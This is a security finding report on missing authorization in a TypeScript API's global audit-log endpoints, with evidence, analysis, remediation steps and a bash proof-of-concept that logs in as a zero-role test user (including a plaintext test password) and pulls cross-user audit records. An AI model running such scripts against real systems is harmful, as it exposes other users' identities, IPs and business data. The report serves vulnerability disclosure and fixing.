# Missing authorization on global audit log endpoints — any authenticated user can read the full system audit trail

**ID:** vuln-0009
**Severity:** MEDIUM
**Found:** 2026-08-18 06:37:49 UTC
**Target:** http://host.docker.internal:3000
**Endpoint:** /api/v1/audit/log
**Method:** GET
**CWE:** CWE-862
**CVSS:** 6.5
**Fix Effort:** Trivial

## Description

The global audit-log endpoints **`GET /api/v1/audit/log`**, **`GET /api/v1/audit/log/:executionId`**, and **`GET /api/v1/audit/stats`** are protected only by the global authentication middleware (any valid Keycloak JWT) with **no role or permission check**. A principal with zero business roles can enumerate the entire security/compliance audit trail — 21,252+ entries exposing every user's `executedBy` ID, `sourceIp`, action parameters, and error details.

## Evidence

Decoded JWT for `cypress-nogroups@tellus.local` (zero business roles):

```json
["offline_access", "marking:PUBLIC", "default-roles-tellus"]
```

Request and response as that zero-role user:

```http
GET /api/v1/audit/log?pageSize=1 HTTP/1.1
Host: host.docker.internal:3000
Authorization: Bearer <zero-role JWT>
```

```http
HTTP/1.1 200 OK
```

```json
{
  "totalCount": 21252,
  "executedBy": "bf763f2c-f585-4af0-947c-b264807eeead",
  "sourceIp": "::1",
  "parameters": {"newParameter": "QA-RW-BK-L-0000048", "newParameter2": "RT-99482"}
}
```

A full page of 10 rows showed only other users' actions (e.g. `createQaRwandaBkcreditdecisions` with `rationale: '123'`, `approvedLimit: 12312`), confirming broad cross-user disclosure rather than self-scoped data.

## Impact

Any authenticated principal, including an account with no assigned business roles (`realm_access.roles = ['offline_access','marking:PUBLIC','default-roles-tellus']`), can read the complete cross-user audit trail. The PoC returned **21,252 audit entries** containing other users' internal user UUIDs (`executedBy`), client IPs (`sourceIp`), and full business parameters of their actions (loan application primary keys such as `QA-RW-BK-L-0000048`, credit-decision `rationale` and `approvedLimit` values, results, and error messages). The file header for this route states the audit log is "legally mandatory — every data modification must be traceable", i.e. it is compliance/security data intended for administrators and auditors only. This is a privacy and regulatory exposure (mass disclosure of who did what, when, from where, across the whole system), and it also aids further attacks by revealing valid object primary keys, user IDs, and internal error details.

## Technical Analysis

The three global audit handlers invoke the audit query path directly, with no authorization middleware between the router and the handler. `globalAuditRouter.get` is called with only a path and the async handler:

```typescript title=src/routes/auditLog.ts startLineNumber=280 endLineNumber=282
globalAuditRouter.get(
  "/log",
  async (req: Request, res: Response, next: NextFunction) => {
```

The router is mounted in `src/server.ts` with no guard either: `app.use("/api/v1/audit", globalAuditRouter);`. The `globalAuth` middleware applied earlier in the stack only verifies that a valid JWT is present (authentication); it performs no role/permission evaluation. Per the project's own route-map analysis, "Routes with NO route-level authz beyond globalAuth: POST /api/v1/sql, /api/v1/audit." The SQL built by `queryAuditLog()` is parameterized (no SQL injection), so the issue is purely the missing function-level authorization. The same codebase already demonstrates the correct pattern: `POST /api/v1/sql/invalidate` in `src/routes/sql.ts` is wrapped with `authorize('ontology-admin')` imported from `src/middleware/auth.ts`.

## Proof of Concept

1. Mint a JWT for the zero-role seeded user `cypress-nogroups@tellus.local` via the Keycloak token endpoint (realm `tellus`, public client `tellus-frontend`, forcing `Host: localhost:8086` so the `iss` claim matches the API allowlist).
2. Decode the JWT and confirm `realm_access.roles` contains no business role (`['offline_access','marking:PUBLIC','default-roles-tellus']`).
3. Send `GET /api/v1/audit/log?pageSize=1` with the `Authorization: Bearer <token>` header.
4. Observe HTTP 200 with `totalCount: 21252` and a row exposing another user's `executedBy` UUID, `sourceIp`, and action `parameters`.

```bash
#!/usr/bin/env bash
# PoC: zero-role user reads the global audit trail (BFLA / missing authorization)
set -euo pipefail

# 1) Mint a short-lived token for the zero-role user (Keycloak realm tellus)
TOKEN=$(curl -s -X POST \
  "http://host.docker.internal:8086/realms/tellus/protocol/openid-connect/token" \
  -H "Host: localhost:8086" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=tellus-frontend&username=cypress-nogroups@tellus.local&password=Password123!&scope=openid" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")

# 2) Show this principal has NO business roles
echo "realm_access.roles:"
echo "$TOKEN" | cut -d. -f2 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); d+='='*(-len(d)%4); print(json.loads(base64.urlsafe_b64decode(d))['realm_access']['roles'])"

# 3) Call the global audit log endpoint as the zero-role user
echo "GET /api/v1/audit/log?pageSize=1"
curl -s "http://host.docker.internal:3000/api/v1/audit/log?pageSize=1" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('totalCount:', d.get('totalCount'))
e = d['data'][0]
print('executedBy:', e['executedBy'])
print('sourceIp:', e['sourceIp'])
print('parameters:', e['parameters'])
"

# 4) The same zero-role token also succeeds on:
#    GET /api/v1/audit/log/<executionId>
#    GET /api/v1/audit/stats
```

## Remediation

Wrap every global audit handler in the existing `authorize` middleware from `src/middleware/auth`, restricted to `ontology-admin` (or a dedicated `auditor` role), mirroring the pattern already used for `POST /api/v1/sql/invalidate` in `src/routes/sql.ts`. Concretely, import `authorize` and add it as the second argument to each of the three `globalAuditRouter.get(...)` registrations (`/log`, `/log/:executionId`, `/stats`). Additionally, scope `executedBy` to the caller for non-admin users if per-user self-audit visibility is ever desired, and keep the action-scoped `actionAuditRouter` consistent with the same authorization decision. Add regression tests asserting a JWT with no business role receives HTTP 403 on all three endpoints, and that an `ontology-admin` JWT receives HTTP 200.

## Assumptions

Assumes any valid Keycloak account in the `tellus` realm, including one with zero assigned business roles. No dev-mode headers or test hooks are required; the finding reproduces with a plain Bearer JWT from the standard token grant.
